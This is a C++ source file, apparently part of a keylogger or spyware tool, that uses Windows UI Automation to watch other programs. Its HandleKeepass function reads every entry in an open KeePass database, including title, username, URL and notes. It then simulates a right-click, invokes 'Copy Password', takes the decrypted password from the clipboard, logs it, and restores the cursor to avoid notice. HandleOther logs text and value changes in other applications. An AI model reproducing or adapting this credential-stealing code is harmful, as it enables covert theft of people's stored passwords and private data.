#include "ChangedEventHandler.h"
#include "EventHandlerApps.h"
#include "Logger.h"
#include "Tree.h"
#include "Helpers.h"

void MyPropertyChangedEventHandler::HandleOther(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar)
{
	//Log(L"HandleOther() in Property Invoked", DBG);

	HRESULT hr = ERROR_SUCCESS;
	BSTR bLocalizedControlType = NULL;
	std::wstring wsLogKeyStroke = L"";

	hr = pAutomationElement->get_CurrentLocalizedControlType(&bLocalizedControlType);
	if (FAILED(hr))
	{
		Log(L"Can't get localized control type", DBG);
		goto exit;
	}


	wsLogKeyStroke = wsDate + L" " + wsProcName + L" [ " + std::wstring(bLocalizedControlType) + L" ]";

	switch (propId) {
	case UIA_NamePropertyId:
		wsLogKeyStroke += L"\nNew Name: " + std::wstring(vVar.bstrVal);
		Log(wsLogKeyStroke, EMPTY);
		break;

	case UIA_ValueValuePropertyId:
		wsLogKeyStroke += L"\nNew Value: " + std::wstring(vVar.bstrVal);
		Log(wsLogKeyStroke, EMPTY);
		break;

	default:
		wsLogKeyStroke += L"\nUnhanled property! Trying to guess..." + std::to_wstring(propId);

		wsLogKeyStroke += L"\n" + Helpers::HandleVariant(vVar);

		Log(wsLogKeyStroke, EMPTY);
		break;
	}
exit:
	if (bLocalizedControlType)
		SysFreeString(bLocalizedControlType);
}


void MyPropertyChangedEventHandler::HandleKeepass(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar)
{
	//Log(L"HandleKeepass() in Property Invoked", DBG);

	IUIAutomation* pAutomation = g_pMyTreeWalker->GetPAutomation();
	if (pAutomation == NULL)
	{
		Log(L"Can't get pAutomation from g_pMyTreeWalker in HandleKeepass()", DBG);
		return;
	}

	HRESULT hr = ERROR_SUCCESS;

	BSTR bDbName = NULL;

	CComPtr<IUIAutomationElement> pDbTreeElement = NULL;
	CComPtr<IUIAutomationCondition> pDbTreeElementCondition = NULL;
	CComPtr<IUIAutomationElement> pBranchDbTreeElement = NULL;
	CComPtr<IUIAutomationCondition> pBranchDbTreeElementCondition = NULL;

	hr = pAutomation->CreatePropertyCondition(UIA_NamePropertyId, _variant_t(L"Database"), &pDbTreeElementCondition);
	if (FAILED(hr) || pDbTreeElementCondition == NULL)
	{
		Log(L"Can't create database property condition", DBG);
		return;
	}

	hr = pAutomation->CreatePropertyCondition(UIA_SelectionItemIsSelectedPropertyId, _variant_t(true), &pBranchDbTreeElementCondition);
	if (FAILED(hr) || pBranchDbTreeElementCondition == NULL)
	{
		Log(L"Can't create true property condition", DBG);
		return;
	}

	pDbTreeElement = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pDbTreeElementCondition);
	if (pDbTreeElement == NULL)
	{
		Log(L"Can't find Database tree element", DBG);
		return;
	}

	pDbTreeElement->FindFirst(TreeScope_Children, pBranchDbTreeElementCondition, &pBranchDbTreeElement);

	if (pBranchDbTreeElement == NULL)
	{
		Log(L"Can't find selected db. May be we are in the root", DBG);
		bDbName = SysAllocString(L"Database");
	}
	else {
		hr = pBranchDbTreeElement->get_CurrentName(&bDbName);
		if (FAILED(hr) || bDbName == NULL)
		{
			Log(L"Can't get db name", DBG);
			return;
		}
	}

	if (previousDb != NULL && wcscmp(previousDb, bDbName) == 0)
	{
		return;
	}

	SysFreeString(previousDb);

	previousDb = SysAllocString(bDbName);

	CComPtr<IUIAutomationCondition> pPassListCondition = NULL;
	CComPtr<IUIAutomationElement> pPassListEl = NULL;
	CComPtr<IUIAutomationElementArray> pElementArrayWithoutHelpButtons = NULL;
	CComPtr<IUIAutomationCondition> pConditionToElementArrayWithoutHelpButtons = NULL;
	CComPtr<IUIAutomationCondition> pTrueCondition = NULL;

	hr = pAutomation->CreateTrueCondition(&pTrueCondition);
	if (FAILED(hr) || pTrueCondition == NULL)
	{
		Log(L"Can't create true condition", DBG);
		return;
	}

	hr = pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, _variant_t(UIA_ListItemControlTypeId), &pConditionToElementArrayWithoutHelpButtons);
	if (FAILED(hr) || pConditionToElementArrayWithoutHelpButtons == NULL)
	{
		Log(L"Can't create condition for password elements", DBG);
		return;
	}

	hr = pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, _variant_t(L"m_lvEntries"), &pPassListCondition);
	if (FAILED(hr) || pPassListCondition == NULL)
	{
		Log(L"Can't create m_lvEntries property condition", DBG);
		return;
	}

	pPassListEl = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pPassListCondition);
	if (pPassListEl == NULL)
	{
		Log(L"Can't find password list in keepass.exe", DBG);
		return;
	}

	hr = pPassListEl->FindAll(TreeScope_Children, pConditionToElementArrayWithoutHelpButtons, &pElementArrayWithoutHelpButtons);
	if (FAILED(hr) || pElementArrayWithoutHelpButtons == NULL)
	{
		Log(L"Can't find passwords in the list", DBG);
		return;
	}

	int count = 0;
	pElementArrayWithoutHelpButtons->get_Length(&count);

	Log(L"Database: " + std::wstring(bDbName), INFO);
	Log(L"Found " + std::to_wstring(count) + L" stored passwords", INFO);

	for (int i = 0; i < count; i++)
	{
		std::wstring wsLogKeyStroke = L"";

		CComPtr<IUIAutomationElement> pEntryElement = NULL;
		VARIANT vValue;
		VariantInit(&vValue);


		hr = pElementArrayWithoutHelpButtons->GetElement(i, &pEntryElement);
		if (FAILED(hr))
		{
			Log(L"Can't get element from list in keepass.exe", DBG);
			continue;
		}

		hr = pEntryElement->GetCurrentPropertyValue(UIA_AutomationIdPropertyId, &vValue);
		if (FAILED(hr) || vValue.bstrVal == NULL || wcscmp(vValue.bstrVal, L"Header") == 0)
		{
			continue;
		}

		CComPtr<IUIAutomationElementArray> pEntryChild = NULL;
		hr = pEntryElement->FindAll(TreeScope_Children, pTrueCondition, &pEntryChild);
		if (FAILED(hr) || pEntryChild == NULL)
		{
			continue;
		}

		BSTR bTitleName = NULL;
		BSTR bUserName = NULL;
		BSTR bPassword = NULL;
		BSTR bURL = NULL;
		BSTR bNotes = NULL;

		CComPtr<IUIAutomationElement> pEntryChildTitleElement = NULL;
		CComPtr<IUIAutomationElement> pEntryChildUsernameElement = NULL;
		CComPtr<IUIAutomationElement> pEntryChildPasswordElement = NULL;
		CComPtr<IUIAutomationElement> pEntryChildUrlElement = NULL;
		CComPtr<IUIAutomationElement> pEntryChildNotesElement = NULL;

		hr = pEntryChild->GetElement(0, &pEntryChildTitleElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChild->GetElement(1, &pEntryChildUsernameElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChild->GetElement(2, &pEntryChildPasswordElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChild->GetElement(3, &pEntryChildUrlElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChild->GetElement(4, &pEntryChildNotesElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChildTitleElement->get_CurrentName(&bTitleName);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nTitle: " + std::wstring(bTitleName);
		}

		hr = pEntryChildUsernameElement->get_CurrentName(&bUserName);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nUsername: " + std::wstring(bUserName);
		}

		hr = pEntryChildPasswordElement->get_CurrentName(&bPassword);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nPassword: " + std::wstring(bPassword);
		}

		hr = pEntryChildUrlElement->get_CurrentName(&bURL);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nURL: " + std::wstring(bURL);
		}

		hr = pEntryChildNotesElement->get_CurrentName(&bNotes);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nNotes: " + std::wstring(bNotes);
		}

		// right-click simulation and copy password to clipboard
		POINT originalCursorPos;
		GetCursorPos(&originalCursorPos);

		RECT rect;
		hr = pEntryChildPasswordElement->get_CurrentBoundingRectangle(&rect);
		if (SUCCEEDED(hr))
		{
			POINT pt = { (rect.left + rect.right) / 2, (rect.top + rect.bottom) / 2 };
			SetCursorPos(pt.x, pt.y);
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);

			//Sleep(300);

			CComPtr<IUIAutomationElement> pMainWindow = NULL;
			CComPtr<IUIAutomationCondition> pMainWindowCondition = NULL;
			CComPtr<IUIAutomationElement> pDropDownMenu = NULL;
			CComPtr<IUIAutomationCondition> pDropDownMenuCondition = NULL;
			CComPtr<IUIAutomationElement> pCopyPasswordButton = NULL;
			CComPtr<IUIAutomationCondition> pCopyPasswordButtonCondition = NULL;

			pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, _variant_t(L"MainForm"), &pMainWindowCondition);
			pAutomation->CreatePropertyCondition(UIA_NamePropertyId, _variant_t(L"DropDown"), &pDropDownMenuCondition);
			pAutomation->CreatePropertyCondition(UIA_NamePropertyId, _variant_t(L"Copy Password"), &pCopyPasswordButtonCondition);

			pMainWindow = g_pMyTreeWalker->FindFirstAscending(pEntryChildPasswordElement, pMainWindowCondition);
			if (pMainWindow != NULL)
			{
				hr = pMainWindow->FindFirst(TreeScope_Children, pDropDownMenuCondition, &pDropDownMenu);

				if (SUCCEEDED(hr) && pDropDownMenu != NULL)
				{

					hr = pDropDownMenu->FindFirst(TreeScope_Children, pCopyPasswordButtonCondition, &pCopyPasswordButton);

					if (SUCCEEDED(hr) && pCopyPasswordButton != NULL)
					{
						CComPtr<IUIAutomationInvokePattern> pInvokePattern;

						hr = pCopyPasswordButton->GetCurrentPattern(UIA_InvokePatternId, (IUnknown**)&pInvokePattern);

						if (SUCCEEDED(hr) && pInvokePattern != NULL)
						{
							//Log(L"Successfully find Copy Password field!", DBG);
							pInvokePattern->Invoke();

							std::wstring wsClipBoardData = L"";
							hr = Helpers::GetClipBoardData(wsClipBoardData);

							if (SUCCEEDED(hr))
							{
								wsLogKeyStroke += L"\nDecrypted Password: " + wsClipBoardData;
							}

						}
					}

				}
			}
		}

		SetCursorPos(originalCursorPos.x, originalCursorPos.y);

		if (bDbName) {
			SysFreeString(bDbName);
		}

		if (bTitleName) {
			SysFreeString(bTitleName);
		}

		if (bUserName) {
			SysFreeString(bUserName);
		}

		if (bPassword) {
			SysFreeString(bPassword);
		}

		if (bURL) {
			SysFreeString(bURL);
		}

		if (bNotes) {
			SysFreeString(bNotes);
		}

		Log(wsLogKeyStroke, EMPTY);

		VariantClear(&vValue);
	}
}

void MyPropertyChangedEventHandler::HandleChrome(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar)
{
	MyPropertyChangedEventHandler::HandleOther(pAutomationElement, wsProcName, wsDate, propId, vVar);
}